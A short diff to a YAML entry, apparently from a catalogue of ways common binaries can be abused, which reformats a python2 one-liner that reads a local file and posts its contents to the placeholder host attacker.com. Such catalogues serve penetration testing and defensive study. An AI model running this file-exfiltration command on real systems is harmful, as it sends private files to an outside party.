@@ -13,7 +13,9 @@ functions:
       code: |
         export URL=http://attacker.com/
         export LFILE=file_to_send
-        python2 -c 'import urllib as u,urllib2 as u2,os.environ as e; u2.urlopen(u2.Request(e["URL"],u.urlencode({"d":open(e["LFILE"]).read()})))'
+        python2 -c 'import urllib as u,urllib2 as u2;
+        from os import environ as e;
+        u2.urlopen(u2.Request(e["URL"],u.urlencode({"d":open(e["LFILE"]).read()})))'
     - description: Serve files in the local folder running an HTTP server.
       code: |
         export LPORT=8888
